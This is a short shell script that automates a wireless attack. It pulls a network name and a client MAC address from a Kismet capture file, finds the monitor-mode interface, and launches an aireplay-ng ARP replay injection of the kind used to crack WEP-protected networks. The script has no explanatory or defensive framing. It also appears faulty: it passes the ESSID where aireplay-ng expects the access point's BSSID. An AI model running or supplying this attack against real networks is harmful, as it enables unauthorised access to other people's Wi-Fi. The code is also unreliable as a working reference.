essid=$(grep "essid" /root/shell-script/captura-01.kismet.netxml | tr "<" ">" | tr ">" "\t" | awk '{print $3}'
)
clientmac=$(grep "client-mac" /root/shell-script/captura-01.kismet.netxml | sed "1! d" | tr "<" ">" | tr ">" "\t" | awk '{print $2}')

interface=$(iwconfig mon0 | sed "1! d" | awk '{print $1}')

$(aireplay-ng --arpreplay -b $essid -h $clientmac $interface)
